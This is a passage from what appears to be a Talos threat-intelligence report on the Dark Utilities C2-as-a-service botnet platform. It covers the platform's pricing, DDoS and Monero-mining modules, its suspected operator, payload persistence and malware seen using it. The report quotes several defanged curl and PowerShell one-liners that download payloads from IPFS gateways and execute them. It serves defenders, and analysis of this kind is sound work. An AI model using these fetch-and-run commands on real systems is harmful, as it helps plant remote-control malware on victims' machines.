The\noperators of the service also established Discord and Telegram communities where they\nprovide technical support and assistance for customers on the platform.\n\n\n-----\n\nDark Utilities provides payloads consisting of code that is executed on victim systems,\nallowing them to be registered with the service and establish a command and control (C2)\ncommunications channel. The platform currently supports Windows, Linux and Pythonbased payloads, allowing adversaries to target multiple architectures without requiring\nsignificant development resources. During our analysis, we observed efforts underway to\nexpand OS and system architecture support as the platform continues to see ongoing\ndevelopment activities occurring.\n\nThe platform, hosted on the clear internet and Tor network, offers premium access to the\nplatform, associated payloads and API endpoints for 9.99 euros. At the time of writing, the\nplatform had enrolled roughly 3,000 users, which is approximately 30,000 euros in income.\nGiven the relatively low cost compared to the amount of functionality the platform offers, it is\nlikely attractive to adversaries attempting to compromise systems without requiring them to\ncreate their own C2 implementation within their malware payloads.\n\n\n-----\n\nAlmost immediately, we observed malware samples using this service in the wild as a way\nto establish C2 communications channels and establish remote access capabilities on\ninfected systems. We've observed malware targeted Windows and Linux systems\nleveraging Dark Utilities.\n\n## Dark Utilities platform functionality\n\nThe Dark Utilities platform leverages Discord for user authentication. Once authenticated,\nusers are presented with a dashboard displaying various statistics about the platform,\nserver health status and other metrics.\n\nTo register new bots with the service, a payload must be generated and deployed on victim\nmachines. At the time of writing, the platform supports several operating systems, as shown\nin the payload selection drop-down below.\n\n\n-----\n\nSelecting an operating system causes the platform to generate a command string that\nthreat actors are typically embedding into PowerShell or Bash scripts to facilitate the\nretrieval and execution of the payload on victim machines. An example of this for a payload\ntargeting the Windows operating system is shown below.\n```\ncd %userprofile%\\Documents && mkdir Steam && cd .\\Steam && curl\nhxxps[:]//ipfs[.]infura[.]io/ipfs/QmRLaPCGa2HZTxMPQxU2VnB9qda3mUv21TXrjbMNqkxN6Z >>\nlauncher.exe && .\\launcher.exe [ACCOUNT_STRING_PARAMETER]\n\n```\nFor Linux-based payloads, an example command string is:\n```\ncd /tmp/;curl\nhxxps[:]//ipfs[.]infura[.]io/ipfs/QmVwqSG7TGceZJ6MWnKgYkiyqnW4qTTRq61ADDfMJaPEoG >\n./tcp-client;chmod +x tcp-client; ./tcp-client [ACCOUNT_STRING_PARAMETER]\n\n```\n\n-----\n\nRecently, the platform added support for other architectures such as ARM64 and ARMV71,\nwhich they describe as being useful for targeting various embedded devices such as\nrouters, phones and internet-of-things (IoT) devices, as shown below.\n\nThe use of IPFS for hosting the payload binaries provides resilience against content\nmoderation or takedowns, as IPFS is a distributed, peer-to-peer network explicitly designed\nto prevent centralized authorities from taking action on content hosted there. IPFS supports\nthe use of [IPFS gateways, which operate similar to Tor2Web gateways in that they allow](https://ipfs.github.io/public-gateway-checker/?ref=blog.talosintelligence.com)\nusers on the internet to access contents hosted within IPFS without requiring a client\napplication to be installed. We have observed adversaries increasingly making use of this\ninfrastructure for payload hosting and retrieval as it effectively provides \"bulletproof hosting.\"\nA public list of IPFS gateways that are maintained is below.\n\n\n-----\n\nFor administering bots that have been registered with the Dark Utilities platform, a\n\"Manager\" administrative panel is provided. The panel lists the systems under the account's\ncontrol and provides several built-in modules for using them to conduct denial-of-service\nattacks, perform cryptocurrency mining, and execute commands across systems under their\ncontrol.\n\nThe platform provides built-in interfaces to conduct two different types of DDoS attacks,\nboth of which support multiple methods. Layer 4 supports TCP, UDP and ICMP, as well as a\nvariety specifically designed for various gaming platforms such as Teamspeak3, Fivem,\nGMOD and Valve, along with specific video games like \"Counter Strike: Global Offensive\"\nand \"Among Us.\" Layer 7 supports the GET, POST, HEAD, PATCH, PUT, DELETE,\nOPTIONS and CONNECT methods. The interface contains forms for configuring Layer 4\nand Layer 7 DDoS attacks respectively, as shown below.\n\n\n-----\n\nThe cryptocurrency mining functionality leverages pool[.]hashvault[.]pro for Monero mining\nand simply requires that the adversary's Monero wallet address be provided.\n\nThe platform also provides distributed command execution as well as a Discord grabber\nthat can be run against large numbers of systems simultaneously.\n\n\n-----\n\nOnce an infected system has established an active C2 channel, the adversary obtains full\naccess to the system in the context of the compromised user account. An interactive\nPowerShell prompt is provided directly within the admin panel.\n\nA built-in Python interpreter allows adversaries to define Python scripts to be executed on\nsystems under their control from within the admin panel itself.\n\n\n-----\n\nThe platform also exposes a REST API that can automate the administration of\ncompromised systems.\n\nExample code is provided for instructing compromised systems to conduct DDoS attacks\nagainst targets.\n\n\n-----\n\nThe marketing and rules associated with the use of the platform appear to attempt to\nminimize liability for the platform operators by staying within legal gray areas with regard to\nthe use of the platform for illegal or illicit purposes.\n\nThe documentation provided by the platform, however, also provides step-by-step\ninstructions for conducting reconnaissance, identifying vulnerabilities and exploiting them to\n\"infect servers\" for use in a botnet.\n\nGiven the low cost associated with the platform and the amount of functionality it provides, it\nis likely that this will continue to be increasingly popular with threat actors seeking to build\nbotnets without requiring significant amounts of time and effort to develop their own\nmalware.\n\n## Who is behind Dark Utilities?\n\n\n-----\n\nDark Utilities appears to have been created and is currently managed by a persona that\ngoes under the moniker Inplex-sys. Looking closer into the history of that persona, Talos\nfound several instances where they claimed to be a French speaker, although we observed\ninplex-sys communicating in English, too. The inplex-sys persona does not have a long\nhistory in the cybercriminal underground space. Aside from a brief interaction on the Hack\nForums platform, inplex-sys has limited their activity to messaging/bot platforms such as\nTelegram and Discord. Shortly after the platform was launched, we observed inplex-sys\nadvertising it within the Lapsus$ Group — a high-profile actor that recently had several\nmembers arrested — Telegram channel.\n\nTalos also found a record for inplex-sys on a doxxing service called Doxbin, which indicated\nthat their location was in Germany. We assess that this Doxbin entry is either incorrect or\nwas intentionally released as a decoy and that they are indeed located in France. Based on\nlimited interaction and other behavioral revelations, it does appear inplex-sys is the main\npersona behind Dark Utilities, however, there is no indication that they manage and\ndeveloped it solely by themselves.\n\nWe observed the same moniker being used on the video game storefront Steam and\nadvertising the Dark Utilities service and others, with links to their respective websites.\n\nSmart Bot is a bot management platform designed for use in launching spam attacks, or\n\"raids\" against the Discord and Twitch communication platforms. These attacks are often\nconducted to disrupt legitimate communications by flooding the platforms with large\nquantities of spam messages, which could cost streamers revenue. Demo videos uploaded\nto YouTube show the tool in action against streamers on Twitch.\n\n\n-----\n\nThe Omega Project purports to be a web panel that can be used to administer servers.\nThey offer a free and paid version of the service. The advertisement displayed on the\nOmega Project website claims that if the Premium service is purchased, customers' servers\nwill be \"secure from all backdoors.\"\n\n\n-----\n\nThe Smart Bot project lists additional individuals as creators of the project. These\nindividuals appear to have a collaborative relationship with inplex-sys, with one of the Smart\nBot creators recently publishing a GitHub repository containing a NodeJS API tool to\ninteract with the Dark Utilities platform.\n\n## Dark Utilities payload analysis\n\nThe Dark Utilities payloads consist of a Python script that has been compiled into either a\nWindows PE32+ executable or a Linux ELF executable. We decompiled the binaries to\nobtain the original Python source code for the payloads.\n\nThe Linux payload available during our analysis did not actually require the runtime\nparameter previously described. If no parameter is specified when the executable is\nlaunched, it associates the bot with a default owner, presumably associated with the\nplatform developer.\n\n\n-----\n\nThe Python script contains code for Windows and Linux-based systems and first identifies\nthe architecture of the system it is running on, CPU information and other system details. It\nthen determines if the payload can be updated by communicating with the Dark Utilities API\nto obtain the latest version information available to compare with the version currently\nrunning on the system.\n\nIf an updated payload is available, the malware will retrieve it via an IPFS gateway, similar\nto what was previously described.\n\nNext, the payload attempts to achieve persistence on the system allowing it to execute\nfollowing system reboots. If the infected system is Windows, the malware will create a\nRegistry run key, as shown below.\n\nIf the system is a Linux-compatible system, the malware will attempt to locate and remove\n[any existing Kinsing malware and clear the existing Crontab configuration.](https://malpedia.caad.fkie.fraunhofer.de/details/elf.kinsing?ref=blog.talosintelligence.com)\n\n\n-----\n\nIt will then create either a Crontab entry or a Systemd service to ensure that the payload is\nlaunched following system reboots.\n\nWe observed that in the version analyzed the alphanumeric string associating the system\nwith a specific Dark Utilities account is not defined when persistence mechanisms are\nestablished, which results in the malware using the default account string described earlier\nfollowing system reboots. This issue was observed on both Windows and Linux systems.\n\nThe script also contains the code responsible for activating various payload functionality\nsuch as cryptocurrency mining, DDoS attacks, etc. If the Monero mining option is deployed,\nthe malware will retrieve XMRig via an IPFS gateway and execute it on the system. The\nmalware uses the Hashvault mining pool and sets a maximum CPU usage value based on\nthe OS of the compromised system.\n\n\n-----\n\nIf Task Manager is launched on the infected machine, the malware attempts to evade\ndetection by terminating the mining process.\n\nThe script also defines a class called Attack with subclasses for Layer4 and Layer7 DDoS\nattack payloads that can be configured and activated via the admin panel previously\ndescribed. Below are some examples of the payloads defined in the script that target\nvarious gaming servers such as \"CS:GO,\" \"AmongUs\" and TeamSpeak.\n\nThe malware uses the following code to handle executing arbitrary system commands using\nthe shell provided in the admin panel. It also supports navigating the filesystem of infected\nmachines via the interface provided by the platform. Python code specified by the adversary\ncan also be executed by the malware payloads.\n\n## Malware currently leveraging Dark Utilities\n\n\n-----\n\nSince the platform was established in early 2022, we have observed a variety of malware\nsamples that leverage Dark Utilities for C2 communications. This includes malware\ntargeting the Windows and Linux operating systems.\n\nIn one example, the Stage 1 payload is an executable responsible for dropping a\nPowerShell script stored within a subfolder of the %TEMP% directory that is also created\nduring Stage 1 execution.\n\nThe PowerShell is then executed as follows:\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" –NoProfile       \n-ExecutionPolicy Bypass -File C:\\Users\\\n[USERNAME]\\AppData\\Local\\Temp\\78E6.tmp\\7916.tmp\\7956.ps1\n\n```\nThe PowerShell is responsible for retrieving the Dark Utilities payload via IPFS and\nexecuting it on the system.\n\nAn example of the PowerShell syntax used is shown below.\n```\ncd C:\\Users\\$env:UserName\\Documents\\;mkdir Github;cd\nC:\\Users\\$env:UserName\\Documents\\GitHub\\;$uri =\n('hxxps[:]//ipfs[.]infura[.]io/ipfs/QmbGk4XnFSY8cn4uHjNq6891uLL1zoPbmTigj7YFyPqA2x')\n;curl $uri -o tcp-client.exe; .\\tcp-client.exe M0ImZlMzJldIRzFHcSRIMilAKkkwZi8\n\n```\nThe Stage 2 payload (the Dark Utilities Windows payload) is stored within a subdirectory of\nthe Documents folder the PowerShell creates. The payload is then executed and passed\nthe threat actor's alphanumeric string. This results in the system registering under the\nattacker's Dark Utilities account, granting them full control of the compromised system. In\n\n\n-----\n\nthis case, the Dark Utilities platform was accessed via a Tor2Web gateway that enables the\ninfected system to communicate with Dark Utilities without requiring the installation of a Tor\nclient.\n\nWe have observed similar implementations targeting other operating systems like Linux,\nwhere adversaries are leveraging shell scripts to perform the payload retrieval and\nexecution, similar to the example shown below:\n\nIn many cases, the alphanumeric string passed as a parameter differs across samples,\nwhich may indicate that multiple distinct threat actors are taking this approach to obtain the\nC2 on compromised systems. The C2 platform itself has moved across various TLDs over\ntime — we have observed samples attempting to retrieve payloads from the site at various\npoints when it was hosted on the ME, XYZ and PW TLDs.\n\n## Conclusion\n\nAlthough the Dark Utilities platform was recently established, thousands of users have\nalready been enrolled and joined the platform. Given the amount of functionality that the\nplatform provides and the relatively low cost of use, we expect this platform will continue to\nrapidly expand its user base. This will likely result in an increase in the volume of malware\nsamples in the wild attempting to establish C2 using the platform. Organizations should be\naware of these C2aaS platforms and ensure that they have security controls in place to help\nprotect their environments. These platforms provide a variety of sophisticated capabilities to\nadversaries who may otherwise be unable to develop them on their own. They effectively\nlower the barrier to entry for cybercriminals entering the threat landscape and enable them\nto quickly begin launching attacks targeting a variety of operating systems. They also offer\nmultiple methods that can be used to further monetize access gained to systems in\ncorporate environments and could lead to further deployment of malware in the\nenvironment once initial access has been obtained.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n\n-----\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html?ref=blog.talosintelligence.com)\n[execution of the malware detailed in this post.
